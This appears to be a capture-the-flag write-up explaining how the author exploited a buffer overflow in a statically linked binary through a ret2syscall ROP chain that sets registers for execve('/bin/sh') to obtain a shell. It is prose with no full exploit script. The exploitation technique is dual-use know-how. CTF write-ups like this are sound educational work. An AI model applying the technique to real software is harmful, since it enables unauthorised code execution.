# TL;DR
Was given a statically linked binary with no libc functions, so ret2libc was not possible. All I/O operations were implemented using native syscalls, so this binary was vulnerable to [ret2syscall](https://www.ctfnote.com/pwn/linux-exploitation/rop/ret2syscall) attack. But it was not striaghtforward to do that as binary had very minimal functions, hence a lack of ROP gadgets. Had to devise clever ways of executing `execve("/bin/sh", 0, 0)` because that is the ultimate goal of the ret2syscall attack.

Need to put address of `/bin/sh` in RDI, 0 in both RSI and RDX to get our desired `execve()` execution. There's a buffer overflow in the given binary. Using the overflow, wrote `/bin/sh` in the `.bss` segment which is also the start of `input_buf` where all inputs are stored. There was no `pop rdx` instruction directly but `pop rsi; pop rdi; jump ADDR` instruction was there with a jump to a particular address which had multiple side effects after jumping. It decremented RSI, incremented RDI, pop a value to RBP and RBX and set RDX to DWORD PTR \[RDI\]. So, what I did is put `0x0` just before `/bin/sh` so that when the execution goes after `pop rsi; pop rdi; jump ADDR` then after popping values into RBP and RBX, the value `0x0` will be put in RDX as RDI will point to it. Then as a side effect mentioned earlier, RDI will be incremented to point to `/bin/sh` and voila! we have our right register states to be ready to execute `syscall`. 

One last thing was to put `0x3b` into RAX as RAX would hold the syscall number for `execve()`. This is where I was stuck for a good time as I was relying on tools like `ROPgadget`, `ropper` to figure out the ROP gadgets. But unfortunately, not a single one of them gave me any instruction involving some `mov` or `pop` or any other instruction so that I can fill RAX with my desired value. Out of frustration, I started manually searching through the disassembly in the hope of finding some instruction that would let me modify RAX. And at one point, I found a `mov ebx, eax` (AT&T Syntax) instruction and I already had a gadget `pop rbx`. This is one crucial lesson that I again got: **Never rely on tools blindly**. So, finally I had all the pieces of the puzzle to execute `syscall` and after that, I got the shell and the flag ðŸ˜€!
